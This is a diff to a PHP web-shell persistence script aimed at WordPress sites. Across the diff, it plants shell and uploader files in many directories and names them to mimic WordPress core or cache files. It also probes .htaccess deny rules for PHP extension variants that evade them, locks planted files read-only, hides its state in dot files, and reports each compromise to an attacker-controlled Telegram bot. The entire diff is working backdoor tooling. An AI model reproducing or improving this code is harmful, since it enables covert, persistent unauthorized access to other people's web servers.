@@ -93,10 +93,156 @@ function geturlsinfo($url) {
     return @file_get_contents($url);
 }
 
+function generateSmartCacheFilename($dir) {
+    $possibleNames = [
+        '.wp-cache.php',
+        '.object-cache.php',
+        '.advanced-cache.php',
+        '.db-cache.php',
+        '.transient-cleanup.php',
+        '.query-cache.php',
+        '.metadata-cache.php',
+        '.options-cache.php'
+    ];
+    
+    $existingFiles = @scandir($dir);
+    if ($existingFiles === false) {
+        return '.wp-cache.php';
+    }
+    
+    foreach ($possibleNames as $name) {
+        if (in_array($name, $existingFiles)) {
+            $filePath = $dir . DIRECTORY_SEPARATOR . $name;
+            $content = @file_get_contents($filePath);
+            if ($content !== false) {
+                $testData = decryptCache($content);
+                if (is_array($testData) && isset($testData['metadata'])) {
+                    return $name;
+                }
+            }
+        }
+    }
+    
+    $patterns = ['cache', 'object', 'transient', 'option', 'meta'];
+    $phpFiles = array_filter($existingFiles, function($f) {
+        return pathinfo($f, PATHINFO_EXTENSION) === 'php' && $f[0] !== '.';
+    });
+    
+    $wordCounts = [];
+    foreach ($phpFiles as $file) {
+        foreach ($patterns as $pattern) {
+            if (stripos($file, $pattern) !== false) {
+                $wordCounts[$pattern] = ($wordCounts[$pattern] ?? 0) + 1;
+            }
+        }
+    }
+    
+    if (!empty($wordCounts)) {
+        arsort($wordCounts);
+        $mostCommon = array_key_first($wordCounts);
+        return ".wp-{$mostCommon}.php";
+    }
+    
+    return '.wp-cache.php';
+}
+
+function detectAllowedExtension($dir) {
+    $htaccessFile = $dir . DIRECTORY_SEPARATOR . '.htaccess';
+    
+    $possibleExtensions = ['.PHP', '.Php', '.PhP', '.pHp', '.php', '.inc', '.phar', '.php7', '.php8'];
+    
+    if (!file_exists($htaccessFile)) {
+        return '.php';
+    }
+    
+    $htaccessContent = @file_get_contents($htaccessFile);
+    if ($htaccessContent === false) {
+        return '.php';
+    }
+    
+    $blockedPatterns = [];
+    
+    if (preg_match_all('/<Files\s+["\']?\*\.([^"\'>\s]+)["\']?>/i', $htaccessContent, $matches)) {
+        foreach ($matches[0] as $index => $fullMatch) {
+            $pattern = $matches[1][$index];
+            $blockStart = strpos($htaccessContent, $fullMatch);
+            $blockEnd = strpos($htaccessContent, '</Files>', $blockStart);
+            
+            if ($blockEnd !== false) {
+                $block = substr($htaccessContent, $blockStart, $blockEnd - $blockStart);
+                if (stripos($block, 'Deny') !== false || stripos($block, 'Require not') !== false) {
+                    $blockedPatterns[] = strtolower($pattern);
+                }
+            }
+        }
+    }
+    
+    foreach ($possibleExtensions as $ext) {
+        $extPattern = ltrim(strtolower($ext), '.');
+        $isBlocked = false;
+        foreach ($blockedPatterns as $blocked) {
+            if (fnmatch($blocked, $extPattern)) {
+                $isBlocked = true;
+                break;
+            }
+        }
+        if (!$isBlocked) {
+            return $ext;
+        }
+    }
+    
+    return '.php';
+}
+
+function generateSmartFilename($dir, &$usedFilenames) {
+    $fallbackNames = [
+        'wp-vcd.php', 'wp-tmp.php', 'wp-feed.php', 'wp-content.php',
+        'xmlrpc-api.php', 'rss-functions.php', 'atom-service.php',
+        'trackback-utils.php', 'pingback-handler.php', 'comment-extra.php',
+        'nav-menu-legacy.php', 'customize-preview.php', 'revisions-diff.php',
+        'embed-template.php', 'oembed-response.php', 'rest-functions.php',
+        'ms-functions.php', 'ms-default-filters.php', 'ms-deprecated.php',
+        'link-template-tags.php', 'general-template-deprecated.php',
+        'post-template-compat.php', 'category-template-legacy.php',
+        'author-template-tags.php', 'date-functions.php', 'time-compat.php',
+        'formatting-deprecated.php', 'kses-legacy.php', 'cron-api.php',
+        'pluggable-deprecated.php', 'capabilities-compat.php',
+        'taxonomy-legacy.php', 'term-meta-compat.php', 'query-deprecated.php',
+        'rewrite-legacy.php', 'vars-deprecated.php', 'class-compat.php',
+        'registration-functions.php', 'admin-deprecated-compat.php',
+        'wp-mail-legacy.php', 'sitemap-functions-compat.php', 'wp-diff-old.php',
+        'random-compat.php', 'compat-mbstring.php', 'sodium-compat.php',
+        'polyfill-deprecated.php', 'shim-legacy.php', 'fallback-compat.php',
+        'bridge-deprecated.php', 'wrapper-legacy.php', 'adapter-compat.php',
+        'locale-deprecated.php', 'i18n-legacy.php', 'translation-compat.php',
+        'cache-deprecated.php', 'object-cache-legacy.php', 'transient-compat.php',
+        'option-deprecated.php', 'meta-legacy.php', 'user-meta-compat.php',
+        'post-meta-deprecated.php', 'comment-meta-legacy.php'
+    ];
+    
+    $allowedExt = detectAllowedExtension($dir);
+    
+    $fallbackNamesWithExt = array_map(function($name) use ($allowedExt) {
+        return str_replace('.php', $allowedExt, $name);
+    }, $fallbackNames);
+    
+    shuffle($fallbackNamesWithExt);
+    
+    foreach ($fallbackNamesWithExt as $name) {
+        if (!isset($usedFilenames[$name]) || $usedFilenames[$name] < 2) {
+            $usedFilenames[$name] = ($usedFilenames[$name] ?? 0) + 1;
+            return $name;
+        }
+    }
+    
+    $timestamp = substr(md5(microtime()), 0, 6);
+    return 'class-' . $timestamp . $allowedExt;
+}
+
 function getCacheFile($webRoot) {
     static $cacheFile = null;
     if ($cacheFile === null) {
-        $cacheFile = $webRoot . DIRECTORY_SEPARATOR . '.mini-cache.php';
+        $cacheFile = $webRoot . DIRECTORY_SEPARATOR . generateSmartCacheFilename($webRoot);
     }
     return $cacheFile;
 }
@@ -134,13 +280,27 @@ function setCacheData($webRoot, $section, $value) {
     return false;
 }
 
-function sendTelegramMessage($botToken, $chatId, $message) {
-    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
-    $data = [
-        'chat_id' => $chatId,
-        'text' => $message,
-        'parse_mode' => 'HTML'
-    ];
+function sendOrEditMessage($webRoot, $botToken, $chatId, $message, $trackType = 'chat') {
+    $telegramData = getCacheData($webRoot, 'telegram') ?? [];
+    $messageIdKey = $trackType . '_message_id';
+    $existingMessageId = $telegramData[$messageIdKey] ?? 0;
+    
+    if ($existingMessageId > 0) {
+        $url = "https://api.telegram.org/bot{$botToken}/editMessageText";
+        $data = [
+            'chat_id' => $chatId,
+            'message_id' => $existingMessageId,
+            'text' => $message,
+            'parse_mode' => 'HTML'
+        ];
+    } else {
+        $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
+        $data = [
+            'chat_id' => $chatId,
+            'text' => $message,
+            'parse_mode' => 'HTML'
+        ];
+    }
     
     $ch = curl_init($url);
     curl_setopt($ch, CURLOPT_POST, 1);
@@ -148,8 +308,19 @@ function sendTelegramMessage($botToken, $chatId, $message) {
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-    @curl_exec($ch);
+    $response = @curl_exec($ch);
     curl_close($ch);
+    
+    $result = json_decode($response, true);
+    
+    if ($result['ok'] && !$existingMessageId) {
+        $newMessageId = $result['result']['message_id'];
+        $telegramData[$messageIdKey] = $newMessageId;
+        $telegramData['last_update'] = time();
+        setCacheData($webRoot, 'telegram', $telegramData);
+    }
+    
+    return $result['ok'] ?? false;
 }
 
 function shouldNotify($webRoot, $cooldown) {
@@ -266,15 +437,8 @@ function selectBestDirs($allDirs, $count) {
     return array_column($selected, 'dir');
 }
 
-function generateLiteFilename($dir) {
-    $names = [
-        'wp-config-sample.php', 'wp-activate.php', 'wp-mail.php',
-        'theme-compat.php', 'plugin-upgrade.php', 'cache-cleanup.php',
-        'admin-ajax-legacy.php', 'rest-api-compat.php', 'cron-handler.php',
-        'deprecated-functions.php', 'template-loader.php', 'formatting-functions.php'
-    ];
-    
-    return $names[array_rand($names)];
+function generateLiteFilename($dir, &$usedFilenames) {
+    return generateSmartFilename($dir, $usedFilenames);
 }
 
 function uploadShellsLite($webRoot, $shellContent, $shellMarker, $maxShells) {
@@ -308,10 +472,11 @@ function uploadShellsLite($webRoot, $shellContent, $shellMarker, $maxShells) {
             
             $selectedDirs = selectBestDirs($availableDirs, $deletedCount);
             
+            $usedFilenames = [];
             $newShellMap = [];
             foreach ($selectedDirs as $dir) {
                 $subdirKey = str_replace($webRoot, '', $dir);
-                $filename = generateLiteFilename($dir);
+                $filename = generateLiteFilename($dir, $usedFilenames);
                 $newShellMap[$subdirKey] = $filename;
             }
             
@@ -331,10 +496,11 @@ function uploadShellsLite($webRoot, $shellContent, $shellMarker, $maxShells) {
         $selectedDirs = selectBestDirs($allDirs, $maxShells);
         echo "Selected {$maxShells} best locations\n";
         
+        $usedFilenames = [];
         $shellMap = [];
         foreach ($selectedDirs as $dir) {
             $subdirKey = str_replace($webRoot, '', $dir);
-            $filename = generateLiteFilename($dir);
+            $filename = generateLiteFilename($dir, $usedFilenames);
             $shellMap[$subdirKey] = $filename;
         }
     }
@@ -345,16 +511,21 @@ function uploadShellsLite($webRoot, $shellContent, $shellMarker, $maxShells) {
     foreach ($shellMap as $subdirKey => $filename) {
         $filePath = $webRoot . $subdirKey . DIRECTORY_SEPARATOR . $filename;
         
-        if (file_exists($filePath)) @chmod($filePath, 0644);
+        if (file_exists($filePath)) {
+            $results[] = "EXISTS: $filePath";
+            $successCount++;
+            echo "  ⏭️  SKIP: {$filename} in {$subdirKey} (already exists)\n";
+            continue;
+        }
         
         if (file_put_contents($filePath, $shellContent) !== false) {
             @chmod($filePath, 0444);
             $results[] = "SUCCESS: $filePath";
             $successCount++;
-            echo "  ✅ {$filename} in {$subdirKey}\n";
+            echo "  ✅ CREATED: {$filename} in {$subdirKey}\n";
         } else {
             $results[] = "FAILED: $filePath";
-            echo "  ❌ {$filename} in {$subdirKey}\n";
+            echo "  ❌ FAILED: {$filename} in {$subdirKey}\n";
         }
     }
     
@@ -440,10 +611,18 @@ function createLiteUploaders($webRoot, $uploaderContent, $maxUploaders) {
     foreach ($uploaderMap as $subdirKey => $filename) {
         $uploaderPath = $webRoot . $subdirKey . DIRECTORY_SEPARATOR . $filename;
         
+        if (file_exists($uploaderPath)) {
+            $backupPaths[] = $uploaderPath;
+            echo "  ⏭️  SKIP: {$filename} in {$subdirKey} (already exists)\n";
+            continue;
+        }
+        
         if (file_put_contents($uploaderPath, $uploaderContent) !== false) {
             @chmod($uploaderPath, 0644);
             $backupPaths[] = $uploaderPath;
-            echo "  ✅ {$filename} in {$subdirKey}\n";
+            echo "  ✅ CREATED: {$filename} in {$subdirKey}\n";
+        } else {
+            echo "  ❌ FAILED: {$filename} in {$subdirKey}\n";
         }
     }
     
@@ -463,12 +642,35 @@ function protectCache($webRoot) {
     $cacheFilename = basename($cacheFile);
     $htaccessFile = $webRoot . DIRECTORY_SEPARATOR . '.htaccess';
     
-    $rules = "\n# Protect mini cache\n<Files \"{$cacheFilename}\">\n    Deny from all\n</Files>\n";
+    $htaccessRules = "
+# Protect cache file
+<Files \"{$cacheFilename}\">
+    Order Allow,Deny
+    Deny from all
+</Files>
+
+# Protect all dot files (hidden files)
+<FilesMatch \"^\\.\">
+    Order Allow,Deny
+    Deny from all
+</FilesMatch>
+";
     
-    if (file_exists($htaccessFile) && is_writable($htaccessFile)) {
-        $content = file_get_contents($htaccessFile);
-        if (strpos($content, $cacheFilename) === false) {
-            @file_put_contents($htaccessFile, $content . $rules);
+    if (!file_exists($htaccessFile)) {
+        if (@file_put_contents($htaccessFile, $htaccessRules) !== false) {
+            @chmod($htaccessFile, 0644);
+            echo "✅ .htaccess protection created\n";
+        }
+    } else {
+        if (!is_writable($htaccessFile)) {
+            @chmod($htaccessFile, 0644);
+        }
+        
+        if (is_writable($htaccessFile)) {
+            $content = @file_get_contents($htaccessFile);
+            if ($content !== false && strpos($content, $cacheFilename) === false) {
+                @file_put_contents($htaccessFile, $content . "\n" . $htaccessRules);
+            }
         }
     }
 }
@@ -629,8 +831,8 @@ if (shouldNotify($webRoot, $notificationCooldown)) {
     $message .= "⏰ " . date('Y-m-d H:i:s') . "\n";
     $message .= "━━━━━━━━━━━━━━━━";
     
-    sendTelegramMessage($telegramBotToken, $telegramChatId, $message);
-    echo "\n✅ Telegram notification sent\n";
+    sendOrEditMessage($webRoot, $telegramBotToken, $telegramChatId, $message, 'chat');
+    echo "\n✅ Telegram notification sent/updated\n";
 } else {
     echo "\n⏭️ Notification skipped (cooldown)\n";
 }
